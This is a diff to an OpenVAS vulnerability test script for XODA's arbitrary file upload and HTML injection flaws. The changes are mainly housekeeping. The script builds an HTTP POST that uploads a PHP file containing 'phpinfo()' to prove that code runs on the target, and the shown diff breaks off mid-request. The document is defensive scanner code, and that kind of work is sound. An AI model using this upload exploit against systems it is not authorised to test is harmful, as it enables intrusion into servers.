@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_xoda_55127.nasl 11159 2018-08-29 10:26:39Z asteins $
+# $Id: gb_xoda_55127.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # XODA Arbitrary File Upload and HTML Injection Vulnerabilities
 #
@@ -25,16 +25,16 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103548");
   script_bugtraq_id(55127);
   script_tag(name:"cvss_base", value:"9.7");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");
-  script_version("$Revision: 11159 $");
+  script_version("$Revision: 11435 $");
   script_name("XODA Arbitrary File Upload and HTML Injection Vulnerabilities");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55127");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-29 12:26:39 +0200 (Wed, 29 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-08-22 11:33:41 +0200 (Wed, 22 Aug 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -62,9 +62,14 @@ Likely none will be provided anymore. General solution options are to upgrade to
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
+
+vtstring = get_vt_string( lowercase:TRUE );
+useragent = get_http_user_agent();
+host = http_host_name( port:port );
 
 foreach dir( make_list_unique( "/xoda", cgi_dirs( port:port ) ) ) {
 
@@ -73,14 +78,13 @@ foreach dir( make_list_unique( "/xoda", cgi_dirs( port:port ) ) ) {
 
   if( http_vuln_check( port:port, url:url, pattern:"<h4>Upload a file" ) ) {
 
-    host = http_host_name( port:port );
-    file = "openvas_" + rand() + ".php";
+    file = vtstring + "_" + rand() + ".php";
     ex = "<?php phpinfo(); ?>";
     len = 361 + strlen(file);
 
-    req = string("POST ",dir,"/?upload HTTP/1.1\r\n",
-                 "Host: ",host,"\r\n",
-                 "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+    req = string("POST ", dir, "/?upload HTTP/1.1\r\n",
+                 "Host: ", host, "\r\n",
+                 "User-Agent: ", useragent, "\r\n",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                  "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
                  "DNT: 1\r\n",
